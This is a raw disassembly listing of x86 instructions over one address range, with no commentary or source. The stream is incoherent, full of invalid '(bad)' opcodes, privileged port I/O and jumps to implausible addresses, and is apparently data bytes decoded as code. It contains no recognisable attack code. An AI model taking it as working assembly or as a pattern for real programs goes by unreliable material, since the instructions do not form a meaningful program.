  429f7b:	add    BYTE PTR [eax],0x0
	...
  429f9a:	add    eax,DWORD PTR fs:[edi+0x6cf69445]
  429fa1:	adc    al,0x9c
  429fa3:	sub    DWORD PTR [esi+0x0],edi
  429fa6:	xor    al,0x7a
  429fa8:	inc    ecx
  429fa9:	lock or eax,0x4d80f003
  429faf:	adc    eax,0x99ece7b0
  429fb4:	add    BYTE PTR [eax],al
  429fb6:	xor    al,0x62
  429fb8:	pop    ss
  429fb9:	cld    
  429fba:	sbb    ah,BYTE PTR [edx-0x27e41439]
  429fc0:	les    edi,FWORD PTR [edi-0x80]
  429fc3:	push   es
  429fc4:	fprem  
  429fc6:	js     0x429fca
  429fc8:	fld    st(5)
  429fca:	cmp    DWORD PTR [ecx+ebx*8],0xaa3873dd
  429fd1:	addr16 jg 0x429f84
  429fd4:	adc    eax,0x7c33e2fc
  429fd9:	retf   
  429fda:	dec    esi
  429fdb:	sbb    DWORD PTR [ebx+0x15e18e56],edi
  429fe1:	call   0x737cc241
  429fe6:	dec    edi
  429fe7:	and    BYTE PTR [eax-0x76cbbcd5],dl
  429fed:	aas    
  429fee:	in     eax,0x9f
  429ff0:	ret    
  429ff1:	outs   dx,DWORD PTR ds:[esi]
  429ff2:	xchg   esi,eax
  429ff3:	pop    ebx
  429ff4:	adc    BYTE PTR [eax+0x4a893d4d],cl
  429ffa:	test   eax,0x73c39f
	...
  42a01b:	add    BYTE PTR [esi-0x279db9d],al
  42a021:	mov    al,ds:0x66714286
  42a026:	ret    
  42a027:	jnp    0x42a035
  42a029:	mov    ds:0x5f36ebc4,al
  42a02e:	add    dl,BYTE PTR [ebp+ecx*2-0x69853f70]
  42a035:	jecxz  0x42a04a
  42a037:	xchg   ch,bl
  42a039:	add    BYTE PTR [edi+0x5405d72],al
  42a03f:	jmp    0x42a08b
  42a041:	jmp    DWORD PTR [ebp-0x62f348d5]
  42a047:	adc    eax,0x2c92c485
  42a04c:	ret    
  42a04d:	sbb    al,0x8d
  42a04f:	adc    eax,0xc1b277b2
  42a054:	and    cl,BYTE PTR ds:0xbffcf7d3
  42a05a:	out    0x88,al
  42a05c:	dec    ebp
  42a05d:	sbb    ch,BYTE PTR [esi-0x56c36d55]
  42a063:	add    eax,DWORD PTR [eax]
  42a065:	hlt    
  42a066:	cli    
  42a067:	icebp  
  42a068:	cmp    al,BYTE PTR [eax]
  42a06a:	ror    DWORD PTR [ebx],0x65
  42a06d:	jo     0x42a0ad
  42a06f:	adc    eax,0x7fdb0de9
  42a074:	(bad)  
  42a075:	shl    esi,0xba
  42a078:	inc    ebx
  42a079:	sbb    DWORD PTR [esi],0x99e7e515
  42a07f:	adc    al,0x0
	...
  42a09d:	add    BYTE PTR [edi],bl
  42a09f:	in     al,dx
  42a0a0:	clc    
  42a0a1:	ret    
  42a0a2:	ret    0x930e
  42a0a5:	repz mov ecx,0x3f14e293
  42a0ab:	clc    
  42a0ac:	or     eax,0xa93c7aef
  42a0b1:	add    ecx,DWORD PTR [esp+eax*2-0x56c74b16]
  42a0b8:	pop    ds
  42a0b9:	inc    ecx
  42a0ba:	test   DWORD PTR [eax-0x4a204f7a],edi
  42a0c0:	jno    0x42a055
  42a0c2:	fidiv  DWORD PTR [ecx+esi*2+0x5e4ad69b]
  42a0c9:	inc    edi
  42a0ca:	int    0xff
  42a0cc:	xor    eax,DWORD PTR [ecx]
  42a0ce:	jp     0x42a0a9
  42a0d0:	mov    edi,0xd8ebff14
  42a0d5:	ret    
  42a0d6:	pop    edx
  42a0d7:	mov    dh,0xff
  42a0d9:	push   ds
  42a0da:	test   BYTE PTR [ecx+0xc78cd23],dl
  42a0e0:	adc    bl,BYTE PTR ds:0x71ffbfd5
  42a0e6:	idiv   BYTE PTR [edi-0x3d]
  42a0e9:	in     eax,0x8d
  42a0eb:	or     ah,bh
  42a0ed:	adc    eax,0xdcfcb264
  42a0f2:	es out dx,eax
  42a0f4:	aas    
  42a0f5:	jmp    0x772b82e0
  42a0fa:	stc    
  42a0fb:	jg     0x42a0f4
  42a0fd:	outs   dx,BYTE PTR ds:[esi]
  42a0fe:	fwait
  42a0ff:	out    dx,eax
  42a100:	imul   esi,ecx,0x0
	...
  42a11e:	add    BYTE PTR [eax],al
  42a120:	mov    dh,0x7c
  42a122:	out    0x5e,eax
  42a124:	and    eax,edi
  42a126:	xlat   BYTE PTR ds:[ebx]
  42a127:	push   esi
  42a128:	jecxz  0x42a0aa
  42a12a:	retf   
  42a12b:	stos   BYTE PTR es:[edi],al
  42a12c:	push   cs
  42a12d:	mov    ch,0x56
  42a12f:	push   edx
  42a130:	mov    esi,0xe71bfa5
  42a135:	add    BYTE PTR [eax],al
  42a137:	jmp    0xc70e:0xaacb60d3
  42a13e:	fcomp  QWORD PTR [ecx+esi*4-0x6c7aa889]
  42a145:	pushf  
  42a146:	push   edi
  42a147:	push   ss
  42a148:	shl    BYTE PTR [edi+ebp*8],0x69
  42a14c:	push   cs
  42a14d:	add    BYTE PTR [edx-0x27],ch
  42a150:	jo     0x42a176
  42a152:	fisubr DWORD PTR [eax+0xe]
  42a155:	add    cl,ch
  42a157:	loopne 0x42a168
  42a159:	test   al,0x5f
  42a15b:	out    dx,al
  42a15c:	push   edi
  42a15d:	mov    al,ds:0xb14ac230
  42a162:	cld    
  42a163:	hlt    
  42a164:	push   0xffffffee
  42a166:	aas    
  42a167:	jmp    0x629d4c2b
  42a16c:	shl    BYTE PTR [edi+0x7000c1],cl
  42a172:	dec    edi
  42a173:	push   esi
  42a174:	fcomip st,st(3)
  42a176:	jl     0x42a1f6
  42a178:	enter  0x8703,0xd9
  42a17c:	add    BYTE PTR [ebx],ah
  42a17e:	xchg   DWORD PTR [esi+0x1c],eax
  42a181:	cmp    eax,0x77d4
	...
  42a1a2:	xor    ebp,DWORD PTR ds:0x6be289bf
  42a1a8:	out    0x6,eax
  42a1aa:	dec    edi
  42a1ab:	fdivr  DWORD PTR [edi+0x66]
  42a1ae:	cld    
  42a1af:	add    ebp,DWORD PTR [eax-0x78]
  42a1b2:	push   0x31fefc44
  42a1b7:	sbb    al,0xe
  42a1b9:	inc    eax
  42a1ba:	hlt    
  42a1bb:	jmp    0x43c8:0x8cab5766
  42a1c2:	in     al,0x46
  42a1c4:	sti    
  42a1c5:	adc    eax,0x3c15f8
  42a1ca:	outs   dx,DWORD PTR ds:[esi]
  42a1cb:	cmp    bp,WORD PTR fs:[edx]
  42a1cf:	inc    DWORD PTR [ecx-0xd]
  42a1d2:	sub    dh,0x70
  42a1d5:	and    al,0xbc
  42a1d7:	mov    dh,BYTE PTR [eax+0x24]
  42a1da:	fmul   QWORD PTR [ecx-0x5]
  42a1dd:	adc    eax,0x3fcba0
  42a1e2:	aas    
  42a1e3:	fdivr  QWORD PTR [edi-0x3c]
  42a1e6:	test   al,0x82
  42a1e8:	idiv   edi
  42a1ea:	cmp    BYTE PTR ds:0x17c1ff53,0xe
  42a1f1:	inc    eax
  42a1f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1f3:	out    0x61,eax
  42a1f5:	jmp    0x687b:0xf87fee9b
  42a1fc:	punpckhdq mm7,QWORD PTR [edi+eiz*2-0x74]
  42a201:	call   0xd84a9061
	...
  42a222:	add    BYTE PTR [eax],al
  42a224:	or     eax,0x5983f732
  42a229:	(bad)  
  42a22a:	add    edx,DWORD PTR [edi-0x3c]
  42a22d:	sub    eax,0x914d6701
  42a232:	add    BYTE PTR [eax],al
  42a234:	or     eax,0x59a40716
  42a239:	(bad)  
  42a23a:	add    esp,DWORD PTR [edi]
  42a23c:	in     eax,0xf0
  42a23e:	mov    eax,0xf20d20fc
  42a243:	aas    
  42a244:	or     eax,0x4e88b1d2
  42a249:	into   
  42a24a:	inc    ebp
  42a24b:	pop    es
  42a24c:	or     eax,0x8eeb7cec
  42a251:	test   DWORD PTR [eax],ecx
  42a253:	jle    0x42a276
  42a255:	popf   
  42a256:	add    BYTE PTR [eax],al
  42a258:	or     eax,0x5bd8d4e6
  42a25d:	dec    edx
  42a25e:	enter  0xc71a,0xcd
  42a262:	(bad)  
  42a265:	popf   
  42a266:	push   edx
  42a267:	(bad)  
  42a268:	jmp    0x18:0xf73a1818
  42a26f:	test   ch,cl
  42a271:	sbb    DWORD PTR [edx+eiz*4+0x3700190d],eax
  42a278:	push   0xa184012d
  42a27d:	sbb    BYTE PTR [eax],al
  42a27f:	add    ah,dh
  42a281:	dec    ebx
  42a282:	lock or al,0x83
  42a285:	test   DWORD PTR [eax],eax
	...
  42a2a3:	add    BYTE PTR [eax],al
  42a2a5:	add    BYTE PTR ds:0x3b07979e,cl
  42a2ab:	icebp  
  42a2ac:	mov    dh,0xf3
  42a2ae:	call   0x829d:0x2bf8509
  42a2b5:	dec    DWORD PTR [edx+0x51875118]
  42a2bb:	jmp    FWORD PTR [ecx]
  42a2bd:	add    al,0xe0
  42a2bf:	or     dh,bl
  42a2c1:	jmp    0x42a2df
  42a2c3:	shl    dh,0x1b
  42a2c6:	pop    ebx
  42a2c7:	sbb    ch,cl
  42a2c9:	adc    DWORD PTR [ebp+0x2e986f0f],edx
  42a2cf:	call   0x9393b53d
  42a2d4:	adc    eax,0xe677409b
  42a2d9:	add    ecx,DWORD PTR ds:0x4667dbff
  42a2df:	mov    esi,0xabd0cae6
  42a2e4:	sbb    al,0x0
  42a2e6:	sub    BYTE PTR [esi+ebx*8+0x2c17487c],dl
  42a2ed:	adc    bl,BYTE PTR [ecx]
  42a2ef:	or     dl,BYTE PTR [ecx-0x1562453]
  42a2f5:	cdq    
  42a2f6:	sbb    al,0x75
  42a2f8:	sbb    esi,esp
  42a2fa:	add    DWORD PTR [edx+esi*8-0x2cf62f84],edx
  42a301:	sti    
  42a302:	jmp    0xa215:0xe9115441
  42a309:	adc    BYTE PTR [eax],al
	...
  42a327:	add    BYTE PTR [edi-0x10],bl
  42a32a:	jae    0x42a2dc
  42a32c:	cs mov esp,0x906973d
  42a332:	mov    ebx,0x3d0fb2fb
  42a337:	adc    ecx,eax
  42a339:	ja     0x42a2e5
  42a33b:	out    0x16,eax
  42a33d:	jge    0x42a35d
  42a33f:	adc    DWORD PTR [edi],edi
  42a341:	shl    BYTE PTR [ecx-0x38],1
  42a344:	out    dx,al
  42a345:	out    0xfe,eax
  42a347:	add    DWORD PTR [ecx+ecx*1+0x18cd7d05],esi
  42a34e:	push   edi
  42a34f:	mov    dl,0x91
  42a351:	or     edi,edi
  42a353:	popf   
  42a354:	sbb    eax,0x4edb1bee
  42a359:	or     ebp,edi
  42a35b:	pop    esp
  42a35c:	or     DWORD PTR [edx+esi*2],0x78e1ded
  42a363:	(bad)  
  42a364:	arpl   WORD PTR [ebp+0x7f092acb],cx
  42a36a:	ret    
  42a36b:	cmc    
  42a36c:	popf   
  42a36d:	stos   DWORD PTR es:[edi],eax
  42a36e:	pop    eax
  42a36f:	jb     0x42a39c
  42a371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a372:	shl    BYTE PTR [esi-0x6dcefeac],0x57
  42a379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a37a:	and    esi,DWORD PTR ds:0xeb41840c
  42a380:	push   cs
  42a381:	add    BYTE PTR [ebx+0x4fc1352d],cl
  42a387:	sub    DWORD PTR [ebx+0x86fcb9],0x0
	...
  42a3a9:	add    BYTE PTR [edi-0x4936dc44],dl
  42a3af:	or     DWORD PTR [eax-0x36],esi
  42a3b2:	mov    edi,DWORD PTR [ebp-0x3bdededd]
  42a3b8:	pop    ebp
  42a3b9:	sbb    ax,0xfcb4
  42a3bd:	hlt    
  42a3be:	loop   0x42a3ae
  42a3c0:	aas    
  42a3c1:	jmp    0x41e34467
  42a3c6:	std    
  42a3c7:	or     edi,esp
  42a3c9:	fcom   QWORD PTR [edx-0x5816bfcc]
  42a3cf:	mov    cl,0x80
  42a3d1:	and    DWORD PTR ds:0x7260b218,ebx
  42a3d7:	fcom   QWORD PTR [edi]
  42a3d9:	jo     0x42a445
  42a3db:	fcom   QWORD PTR [ebx]
  42a3dd:	push   ecx
  42a3de:	or     bl,bh
  42a3e0:	add    DWORD PTR [ebx+0x6200000f],0xffffffdc
  42a3e7:	and    BYTE PTR [esi-0x4100300],ch
  42a3ed:	mov    ebp,esp
  42a3ef:	adc    edi,0xfcb0f80f
  42a3f5:	push   DWORD PTR [ebx+eax*4-0x48]
  42a3f9:	and    al,0xe8
  42a3fb:	add    eax,DWORD PTR [eax]
  42a3fd:	add    BYTE PTR [ebp+0x9],ah
  42a400:	adc    DWORD PTR [ebx-0x7500038c],0x7c17c0
  42a40a:	fs cld 
  42a40c:	jle    0x42a487
	...
  42a42a:	add    BYTE PTR [eax],al
  42a42c:	push   0xb6840afc
  42a431:	add    eax,DWORD PTR [eax]
  42a433:	add    cl,ah
  42a435:	aaa    
  42a436:	and    BYTE PTR [eax-0x3f],cl
  42a439:	outs   dx,DWORD PTR ds:[esi]
  42a43a:	and    BYTE PTR [esp+ebx*4],ah
  42a43d:	(bad)  
  42a43e:	pop    esp
  42a43f:	inc    DWORD PTR [ebx-0x4bdb4f08]
  42a445:	add    eax,DWORD PTR [eax]
  42a447:	add    BYTE PTR [edi+esi*1+0x779f1720],bl
  42a44e:	and    BYTE PTR [eax-0x17fffc0c],cl
  42a454:	iret   
  42a455:	push   ebp
  42a456:	sti    
  42a457:	jmp    DWORD PTR [eax+esi*2+0x20]
  42a45b:	adc    esp,esp
  42a45d:	push   es
  42a45e:	or     BYTE PTR [ebx],0xf5
  42a461:	add    eax,DWORD PTR [eax]
  42a463:	push   0x53
  42a465:	div    DWORD PTR [eax+0x24]
  42a468:	fdiv   st,st(6)
  42a46a:	adc    DWORD PTR [edi+esi*4],ebx
  42a46d:	inc    ebx
  42a46e:	cld    
  42a46f:	dec    BYTE PTR [eax+0x73e8241f]
  42a475:	jne    0x42a473
  42a477:	push   ebx
  42a479:	and    BYTE PTR [bx+si],dh
  42a47c:	adc    ecx,DWORD PTR [ecx]
  42a47e:	add    BYTE PTR [ebx],dl
  42a480:	or     eax,0x21890059
  42a485:	cmp    eax,0xe9a82dc
  42a48a:	test   bh,bl
  42a48c:	or     eax,0x8b0019
	...
  42a4ad:	add    cl,dl
  42a4af:	xor    al,0xb8
  42a4b1:	out    0x97,eax
  42a4b3:	je     0x42a4c2
  42a4b5:	cld    
  42a4b6:	xchg   ah,cl
  42a4b8:	repz mov cl,cl
  42a4bb:	cld    
  42a4bc:	out    dx,eax
  42a4bd:	(bad)
  42a4c0:	add    BYTE PTR [edi+0x4220e6],al
  42a4c6:	or     al,0x1a
  42a4c8:	inc    ebx
  42a4c9:	xchg   bl,cl
  42a4cb:	mov    al,0x45
  42a4cd:	inc    ebp
  42a4ce:	mov    ecx,0x439f1b17
  42a4d3:	push   esi
  42a4d4:	or     eax,0xd08c0fc
  42a4d9:	jb     0x42a4dc
  42a4db:	jno    0x42a541
  42a4dd:	jge    0x42a4ec
  42a4df:	sbb    DWORD PTR [ebx+0x43],edi
  42a4e2:	jmp    0xa1022bf7
  42a4e7:	and    BYTE PTR ds:0x98e9b3,cl
  42a4ed:	add    BYTE PTR ds:0x952384a2,cl
  42a4f3:	sbb    BYTE PTR [eax],al
  42a4f5:	add    ch,ah
  42a4f7:	jne    0x42a4a8
  42a4f9:	cld    
  42a4fa:	repnz scas eax,DWORD PTR es:[edi]
  42a4fc:	jg     0x42a4fd
  42a4fe:	jmp    0x94b6:0xd004218
  42a505:	and    edi,DWORD PTR ds:0x3523c492
  42a50b:	mov    cl,0x0
  42a50d:	or     ax,0x7b19
  42a511:	inc    eax
	...
  42a52e:	add    BYTE PTR [eax],al
  42a530:	adc    eax,0x8d2384a2
  42a535:	jmp    esi
  42a537:	add    ecx,DWORD PTR ds:0x95ffa979
  42a53d:	jnp    0x42a509
  42a53f:	xchg   DWORD PTR [edx-0x136619fa],esp
  42a545:	js     0x42a4f0
  42a547:	xrelease xchg DWORD PTR [ebx+0x17e2cbc2],eax
  42a54e:	icebp  
  42a54f:	add    DWORD PTR ds:0x87e28100,ecx
  42a555:	or     DWORD PTR [edx],0xffffffdc
  42a558:	ficom  DWORD PTR [edi]
  42a55a:	int    0x1
  42a55c:	or     eax,0xd2456200
  42a561:	je     0x42a585
  42a563:	call   0x9808558a
  42a568:	add    al,BYTE PTR [edi]
  42a56a:	xor    ch,al
  42a56c:	out    dx,al
  42a56d:	pop    ss
  42a56e:	lods   al,BYTE PTR ds:[esi]
  42a56f:	into   
  42a570:	inc    ecx
  42a571:	push   es
  42a572:	inc    eax
  42a573:	out    0x85,eax
  42a575:	daa    
  42a576:	jae    0x42a508
  42a578:	out    dx,al
  42a579:	out    0x3e,eax
  42a57b:	sbb    al,0x57
  42a57d:	add    ah,bh
  42a57f:	add    edx,DWORD PTR [esi+edi*1-0x74e64eca]
  42a586:	retf   0x2ae3
  42a589:	stc    
  42a58a:	mov    esp,0xcd9b090c
  42a58f:	js     0x42a56b
  42a591:	jae    0x42a57d
  42a593:	out    0x0,eax
	...
  42a5b1:	add    BYTE PTR [edx-0x58],al
  42a5b4:	dec    esi
  42a5b5:	push   edx
  42a5b6:	or     eax,0xd178e700
  42a5bb:	mov    al,0xb9
  42a5bd:	or     al,0x5e
  42a5bf:	fadd   QWORD PTR [esi]
  42a5c1:	sbb    al,0xe9
  42a5c3:	ret    
  42a5c4:	inc    ebp
  42a5c5:	or     eax,0xf802bc8b
  42a5ca:	sar    BYTE PTR [edi+edi*8+0x7401a90c],0x96
  42a5d2:	xor    eax,0x8a012389
  42a5d7:	add    al,0x72
  42a5d9:	icebp  
  42a5da:	and    eax,0x72620b8a
  42a5df:	cmc    
  42a5e0:	call   0x23ebbbca
  42a5e5:	fst    QWORD PTR [ebx]
  42a5e7:	shl    DWORD PTR [ebx],0xe1
  42a5ea:	mov    esi,0x9acd7304
  42a5ef:	js     0x42a5b1
  42a5f1:	out    dx,al
  42a5f2:	mov    ds:0x113e73e1,al
  42a5f7:	adc    eax,0x419deef
  42a5fc:	jae    0x42a60b
  42a5fe:	lods   eax,DWORD PTR ds:[esi]
  42a5ff:	jle    0x42a644
  42a601:	add    eax,0x444b1d69
  42a606:	or     DWORD PTR [eax],eax
  42a608:	cmp    DWORD PTR ds:0x3bfff135,0xdd7ac840
  42a612:	mov    ds:0x2586b7,al
	...
  42a633:	add    BYTE PTR ds:0x353d86ed,ah
  42a639:	icebp  
  42a63a:	call   0xbccfc21
  42a63f:	adc    eax,0xd2e7ab13
  42a644:	add    DWORD PTR ds:0xe09a72fc,0x17
  42a64b:	ins    BYTE PTR es:[edi],dx
  42a64c:	adc    DWORD PTR [ecx-0x1f2da3d6],edx
  42a652:	inc    edi
  42a653:	push   ecx
  42a654:	retf   0xfca8
  42a657:	pop    esi
  42a658:	shl    DWORD PTR gs:[ebx],0xf5
  42a65c:	lea    ebx,[edx-0x44a816a1]
  42a662:	add    BYTE PTR [bx+0x3d],bl
  42a666:	and    BYTE PTR [edi*1+0x718b583b],dl
  42a66d:	adc    dl,al
  42a66f:	inc    esi
  42a670:	js     0x42a672
  42a672:	test   DWORD PTR [esi-0x34],edi
  42a675:	mov    DWORD PTR [edx+0x64],eax
  42a678:	std    
  42a679:	inc    ecx
  42a67a:	stc    
  42a67b:	(bad)  
  42a67c:	sti    
  42a67d:	test   DWORD PTR [eax+0x24],eax
  42a680:	ins    BYTE PTR es:[edi],dx
  42a681:	call   0xf44e0299
  42a686:	xchg   DWORD PTR [eax+edx*2+0x14],eax
  42a68a:	xchg   DWORD PTR [ebp+0x64],ecx
  42a68d:	(bad)  
  42a68e:	mov    esp,0xc268b289
  42a693:	inc    esi
  42a694:	fdivr  st,st(3)
  42a696:	in     al,0x37
	...
  42a6b4:	add    BYTE PTR [eax],al
  42a6b6:	dec    ecx
  42a6b7:	clc    
  42a6b8:	sti    
  42a6b9:	push   ebp
  42a6ba:	out    dx,eax
  42a6bb:	out    0x7c,eax
  42a6bd:	cmp    eax,0x3fc4ae
  42a6c2:	fs dec ebp
  42a6c4:	xchg   DWORD PTR [ebp+0x3c],ebx
  42a6c7:	dec    esi
  42a6c8:	push   ebx
  42a6c9:	je     0x42a6d0
  42a6cb:	sub    eax,0x6f8b3bfb
  42a6d0:	addr16 cmp ecx,ebp
  42a6d3:	pop    es
  42a6d4:	jp     0x42a73c
  42a6d6:	jl     0x42a6b9
  42a6d8:	loop   0x42a6da
  42a6da:	xor    al,0x84
  42a6dc:	mov    esp,0x8463e974
  42a6e1:	int3   
  42a6e2:	out    0xfb,eax
  42a6e4:	cli    
  42a6e5:	adc    eax,0x3c0dec
  42a6ea:	mov    ebp,0x267e0878
  42a6ef:	out    dx,al
  42a6f0:	inc    eax
  42a6f1:	sti    
  42a6f2:	loopne 0x42a6f0
  42a6f4:	jae    0x42a72b
  42a6f6:	pop    edi
  42a6f7:	xor    bh,dh
  42a6f9:	call   0xfc642d0b
  42a6fe:	ficom  DWORD PTR [esi-0xea603f5]
  42a704:	call   0xe00:0x1995bf
  42a70b:	adc    al,0x5c
  42a70d:	retf   
  42a70e:	dec    esi
  42a70f:	sbb    DWORD PTR [ebp-0x70e6c689],eax
  42a715:	cmp    ecx,DWORD PTR [ebp+0xff8761]
	...
  42a737:	add    BYTE PTR [ecx],bl
  42a739:	and    edi,DWORD PTR [ebp-0x39]
  42a73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a73d:	mov    ds:0x9492fc20,eax
  42a742:	inc    ebx
  42a743:	jae    0x42a755
  42a745:	or     eax,DWORD PTR [eax]
  42a747:	(bad)  
  42a748:	stc    
  42a749:	xor    al,cl
  42a74b:	cmp    al,bh
  42a74d:	and    al,0x84
  42a74f:	mov    ebp,0x403490e5
  42a754:	or     eax,0xff1bef22
  42a759:	fadd   DWORD PTR [ebx]
  42a75b:	std    
  42a75c:	loopne 0x42a766
  42a75e:	or     DWORD PTR [edx+0x1],esi
  42a761:	out    0x8,al
  42a763:	adc    cl,cl
  42a765:	push   esp
  42a766:	(bad)  
  42a769:	push   ebp
  42a76a:	hlt    
  42a76b:	pop    esp
  42a76c:	fucomi st,st(5)
  42a76e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a76f:	shl    BYTE PTR [ebp+0xd403490],0x62
  42a776:	out    dx,eax
  42a777:	sbb    edi,edi
  42a779:	fadd   DWORD PTR [ebx]
  42a77b:	xor    DWORD PTR [ebp-0x27],ecx
  42a77e:	mov    eax,ds:0xfe7dc986
  42a783:	mov    dl,dl
  42a785:	ins    DWORD PTR es:[edi],dx
  42a786:	sbb    al,0x82
  42a788:	fild   WORD PTR [edi+edi*4]
  42a78b:	mov    DWORD PTR [edi],eax
  42a78d:	popf   
  42a78e:	cmp    esi,DWORD PTR [ebx+0x32]
  42a791:	add    BYTE PTR [edx],bl
  42a793:	inc    esp
  42a794:	push   0x9
  42a796:	or     edx,DWORD PTR [ecx-0x541769f1]
	...
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	in     eax,0xfc
  42a7bc:	data16 or al,0x25
  42a7bf:	(bad)  
  42a7c0:	out    0xc5,eax
  42a7c2:	pusha  
  42a7c3:	iret   
  42a7c4:	xor    al,0x1e
  42a7c6:	adc    al,BYTE PTR [eax-0x11c633d1]
  42a7cc:	rcl    DWORD PTR [ecx],0x4
  42a7cf:	repz fs cmp al,0x97
  42a7d3:	mov    ebp,esp
  42a7d5:	xor    ecx,DWORD PTR [esi+esi*2-0x20]
  42a7d9:	and    DWORD PTR [ebx-0x71e37431],0x38
  42a7e0:	jp     0x42a7e8
  42a7e2:	mov    WORD PTR [edi],?
  42a7e4:	out    0x5b,eax
  42a7e6:	or     al,0x8c
  42a7e8:	call   0xb5baffff
  42a7ed:	test   eax,0x40d7e4d
  42a7f2:	div    edi
  42a7f4:	ds inc ebp
  42a7f6:	mov    edi,0x6683c276
  42a7fb:	lahf   
  42a7fc:	loop   0x42a801
  42a7fe:	or     eax,0x12a771af
  42a803:	stos   BYTE PTR es:[edi],al
  42a804:	adc    eax,0x2688e69c
  42a809:	add    al,0xdc
  42a80b:	je     0x42a870
  42a80d:	pusha  
  42a80e:	xor    eax,0x95b4a502
  42a813:	adc    BYTE PTR [esi-0x6afd9875],cl
  42a819:	jg     0x42a875
  42a81b:	mov    esi,ds
  42a81d:	popf   
	...
  42a83a:	add    BYTE PTR [eax],al
  42a83c:	or     eax,0xbaf8fa8
  42a841:	add    ah,dh
  42a843:	jbe    0x42a7d4
  42a845:	push   esp
  42a846:	push   DWORD PTR [ebx+0x4]
  42a849:	add    al,0x4f
  42a84b:	pop    esp
  42a84c:	jb     0x42a8ab
  42a84e:	clc    
  42a84f:	data16 adc al,0xb1
  42a852:	cld    
  42a853:	hlt    
  42a854:	fsubp  st(7),st
  42a856:	aas    
  42a857:	jmp    0x6a4a66b3
  42a85c:	add    DWORD PTR [edx+esi*2],eax
  42a85f:	in     eax,dx
  42a860:	test   al,0xfd
  42a862:	call   0x8a47808a
  42a867:	ins    BYTE PTR es:[edi],dx
  42a868:	jmp    0x1171a472
  42a86d:	scas   eax,DWORD PTR es:[edi]
  42a86e:	fsubr  st,st(1)
  42a870:	push   cs
  42a871:	jl     0x42a832
  42a873:	out    dx,al
  42a874:	and    ebp,DWORD PTR [esi]
  42a876:	(bad)  
  42a877:	call   0x62501f8a
  42a87c:	push   cs
  42a87d:	jne    0x42a811
  42a87f:	push   ebp
  42a880:	adc    al,BYTE PTR [esp+edi*8]
  42a883:	fwait
  42a884:	mov    ecx,0xfbed4f04
  42a889:	inc    eax
  42a88a:	jae    0x42a86d
  42a88c:	mov    DWORD PTR [ecx],ecx
  42a88e:	dec    bh
  42a890:	(bad)  
  42a891:	add    ah,bh
  42a893:	jmp    0xd4ee2694
  42a898:	add    eax,0xd2de0f04
  42a89d:	jl     0x42a89e
  42a89f:	call   0x42a8a4
	...
  42a8bc:	add    BYTE PTR [eax],al
  42a8be:	push   cs
  42a8bf:	or     al,BYTE PTR [ebp-0xf]
  42a8c2:	or     BYTE PTR [eax+eiz*1-0x5d7449c],cl
  42a8c9:	scas   al,BYTE PTR es:[edi]
  42a8ca:	add    eax,0xe94e7b1
  42a8cf:	add    BYTE PTR [eax],al
  42a8d1:	gs into 
  42a8d3:	mov    WORD PTR [eax],ss
  42a8d5:	bound  edx,QWORD PTR [eax+edi*2]
  42a8d8:	(bad)  
  42a8d9:	pop    ebx
  42a8da:	mov    ds:0x9300fa54,eax
  42a8df:	test   DWORD PTR [esi+0x53],0x85044d83
  42a8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8e7:	jno    0x42a8a7
  42a8e9:	imul   BYTE PTR [edx]
  42a8eb:	add    al,0xfd
  42a8ed:	jae    0x42a8e1
  42a8ef:	mov    DWORD PTR [ecx-0x407be28],eax
  42a8f5:	push   eax
  42a8f6:	xchg   edi,eax
  42a8f7:	mov    DWORD PTR [ecx-0x407c05c],eax
  42a8fd:	push   eax
  42a8fe:	pop    esp
  42a8ff:	retf   0xffb8
  42a902:	add    eax,DWORD PTR [edx+0x62a975bc]
  42a908:	call   FWORD PTR [esi+0x4f]
  42a90b:	pop    ss
  42a90c:	mov    DWORD PTR [ebp-0x40ba8],eax
  42a912:	fs or  edx,0xffffffe8
  42a916:	sahf   
  42a917:	idiv   ebx
  42a919:	jmp    FWORD PTR [edi]
  42a91b:	cmc    
  42a91c:	cmp    edi,0xff7f4a08
	...
  42a93e:	add    BYTE PTR [eax],al
  42a940:	jne    0x42a9b2
  42a942:	imul   eax,DWORD PTR [ebx+0x6873fb83],0x18706ef
  42a94c:	sub    eax,DWORD PTR [edi-0x7be536f]
  42a952:	sti    
  42a953:	push   edx
  42a954:	pop    ss
  42a955:	stc    
  42a956:	dec    esp
  42a957:	or     al,0xe7
  42a959:	repz push DWORD PTR [ebx-0x3c]
  42a95d:	loop   0x42a9c2
  42a95f:	inc    DWORD PTR [ebx+0x2c46f2f8]
  42a965:	add    BYTE PTR [eax+0x23],dh
  42a968:	sar    DWORD PTR [esi-0x2c],1
  42a96b:	std    
  42a96c:	jae    0x42a966
  42a96e:	dec    esp
  42a96f:	call   0x42a571
  42a974:	or     eax,0xfe734393
  42a979:	popf   
  42a97a:	cmc    
  42a97b:	mov    BYTE PTR [esp+esi*2],cl
  42a97e:	jno    0x42a92b
  42a980:	add    BYTE PTR [edi+0x3],bh
  42a983:	push   ecx
  42a984:	pop    esi
  42a985:	jbe    0x42a93b
  42a987:	pop    es
  42a988:	mov    BYTE PTR [ecx+0x6c981991],ch
  42a98e:	pop    eax
  42a98f:	cli    
  42a990:	loop   0x42a9f0
  42a992:	mov    ah,0xfc
  42a994:	pusha  
  42a995:	loope  0x42a999
  42a997:	adc    cl,BYTE PTR [ecx]
  42a999:	sti    
  42a99a:	mov    edi,0xf32991ff
  42a99f:	or     BYTE PTR ds:0xfc033e,0x0
	...
  42a9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9c3:	loop   0x42a993
  42a9c5:	(bad)  
  42a9c6:	mov    ?,WORD PTR [ecx]
  42a9c8:	dec    BYTE PTR [eax+eax*4]
  42a9cb:	sub    BYTE PTR [ecx+0x76],bh
  42a9ce:	or     al,0x1e
  42a9d0:	icebp  
  42a9d1:	or     edi,esi
  42a9d3:	test   al,0xff
  42a9d5:	mov    BYTE PTR [ebp+0x15720364],bl
  42a9db:	push   0x2
  42a9dd:	adc    ecx,edi
  42a9df:	jmp    0xf61cad7d
  42a9e4:	nop
  42a9e5:	pop    es
  42a9e6:	jb     0x42a9bc
  42a9e8:	repz adc ebp,ecx
  42a9eb:	call   0x153ba69d
  42a9f0:	out    dx,al
  42a9f1:	aas    
